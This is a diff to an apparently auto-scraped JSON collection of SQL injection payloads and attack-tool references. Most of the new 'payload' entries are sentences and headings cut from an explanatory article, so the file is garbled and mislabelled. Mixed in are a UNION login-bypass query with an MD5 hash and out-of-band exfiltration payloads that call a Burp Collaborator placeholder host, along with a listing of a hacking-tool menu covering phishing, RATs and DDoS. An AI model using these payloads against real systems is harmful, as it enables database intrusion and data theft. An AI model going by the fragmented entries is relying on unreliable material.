@@ -1,14 +1,14 @@
 {
   "metadata": {
     "version": "1.0",
-    "updated": "2026-03-11T04:18:46.400698",
+    "updated": "2026-03-12T08:27:30.095822",
     "sources": [
       "GitHub",
       "PortSwigger",
       "CVE Database",
       "OWASP"
     ],
-    "total_payloads": 69
+    "total_payloads": 80
   },
   "union_based": {
     "numeric": [],
@@ -337,6 +337,69 @@
         "source": "OWASP",
         "discovered_at": "2026-03-11T04:18:45.734193",
         "verified": false
+      },
+      {
+        "payload": "By 2025, applications almost never store plaintext passwords. Authentication systems instead use a representation of the password (a hash derived by a key-derivation function, often with a salt). That evolution changes the mechanics of some classic SQL injection (SQLi) bypasses: an attacker who injects rows via `UNION` must now supply values that match the stored representation the application expects, not the user's raw password.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484935",
+        "verified": false
+      },
+      {
+        "payload": "* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484953",
+        "verified": false
+      },
+      {
+        "payload": "If an attacker can inject an extra row into the result set (for example using `UNION`), they can make the application receive an attacker-controlled stored_password_hash. If that injected hash equals `hash(attacker_supplied_password)` as computed by the app, the comparison succeeds and the attacker is authenticated as the injected username.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484957",
+        "verified": false
+      },
+      {
+        "payload": "* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5(\"P@ssw0rd\")`.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484961",
+        "verified": false
+      },
+      {
+        "payload": "## UNION Based Injection",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484965",
+        "verified": false
+      },
+      {
+        "payload": "In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484967",
+        "verified": false
+      },
+      {
+        "payload": ":warning: The 2 SELECT clauses must have the same number of columns.",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.484973",
+        "verified": false
+      },
+      {
+        "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.485003",
+        "verified": false
+      },
+      {
+        "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+        "category": "union_based",
+        "source": "OWASP",
+        "discovered_at": "2026-03-12T08:27:29.485006",
+        "verified": false
       }
     ]
   },
@@ -515,6 +578,26 @@
       "description": "Automatic SQL injection and database takeover tool",
       "stars": 36800,
       "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: sqlmapproject/sqlmap",
+      "url": "https://github.com/sqlmapproject/sqlmap",
+      "description": "Automatic SQL injection and database takeover tool",
+      "stars": 36808,
+      "language": "Python",
+      "category": "reference_tool",
+      "source": "GitHub",
+      "verified": false
+    },
+    {
+      "payload": "GitHub: tnt-wolve/ch3r0",
+      "url": "https://github.com/tnt-wolve/ch3r0",
+      "description": "Hackingtool Menu 🧰 AnonSurf Information Gathering Password Attack Wireless Attack SQL Injection Tools Phishing Attack Web Attack Tool Post exploitation Forensic Tools Payload Creator Router Exploit Wifi Jamming XSS Attack Tool Reverse Engineering SocialMedia Finder DDos Attack Tools Steganography Tools IDN Homograph Attack Hash Cracking Tools SocialMedia Attack Android Hack RAT Tools Web Crawling Payload Injector Update System AnonSurf Anonmously Surf Multitor Information Gathering Nmap Dracnmap Port Scanning Host To IP Xerosploit Infoga - Email OSINT ReconSpider RED HAWK (All In One Scanning) ReconDog Striker SecretFinder Port Scanner Breacher Password Attack Cupp WordlistCreator Goblin WordGenerator Credential reuse attacks Wordlist (Contain 1.4 Billion Pass) Wireless Attack WiFi-Pumpkin pixiewps Bluetooth Honeypot GUI Framework Fluxion Wifiphisher Wifite EvilTwin SQL Injection Tools sqlmap tool NoSqlMap Damn Small SQLi Scanner Explo Blisqy - Exploit Time-based blind-SQL injection Leviathan - Wide Range Mass Audit Toolkit SQLScan SocialMedia Attack Instagram Attack AllinOne SocialMedia Attack Facebook Attack Application Checker Android Attack Keydroid MySMS Lockphish (Grab target LOCK PIN) DroidCam (Capture Image) EvilApp (Hijack Session) Phishing Attack Setoolkit SocialFish HiddenEye Evilginx2 Shellphish BlackEye I-See-You(Get Location using phishing attack) SayCheese (Grab target's Webcam Shots) QR Code Jacking Web Attack SlowLoris Skipfish SubDomain Finder CheckURL Blazy Sub-Domain TakeOver Post Explotation Vegile - Ghost In The Shell Chrome Keylogger Forensic Tool Bulk_extractor Disk Clone and ISO Image Aquire AutoSpy Toolsley Wireshark Payload Generator The FatRat* Brutal Stitch MSFvenom Payload Creator Venom Shellcode Generator Spycam Mob-Droid Exploit Framework RouterSploit WebSploit Commix Web2Attack Fastssh SocialMedia Finder Find SocialMedia By Facial Recognation System Find SocialMedia By UserName Sherlock SocialScan Steganography SteganoHide StegnoCracker Whitespace Ddos Attack tool SlowLoris SYN Flood DDoS Weapon UFOnet GoldenEye XSS Attack tool DalFox(Finder of XSS) XSS Payload Generator Advanced XSS Detection Suite Extended XSS Searcher and Finder XSS-Freak XSpear XSSCon XanXSS IDN Homograph EvilURL Email Verifier KnockMail Hash Cracking Tool Hash Buster",
+      "stars": 309,
+      "language": null,
       "category": "reference_tool",
       "source": "GitHub",
       "verified": false
